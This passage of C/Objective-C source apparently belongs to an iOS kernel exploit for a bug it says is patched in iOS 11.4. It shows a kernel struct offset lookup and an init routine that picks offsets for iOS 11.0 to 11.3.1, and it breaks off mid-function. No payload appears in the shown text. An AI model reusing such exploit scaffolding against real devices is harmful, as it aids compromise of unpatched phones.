...
int empty_list_koffset(enum kstruct_offset offset) {
  if (empty_list_offsets == NULL) {
    printf("need to call offsets_init() prior to querying offsets\n");
    return 0;
  }
  return empty_list_offsets[offset];
}


void empty_list_offsets_init() {
  if (@available(iOS 11.4, *)) {
    printf("this bug is patched in iOS 11.4 and above\n");
    exit(EXIT_FAILURE);
  } else if (@available(iOS 11.0, *)) {
    printf("offsets selected for iOS 11.0 to 11.3.1\n");
    empty_list_offsets = kstruct_offsets;
  } else {
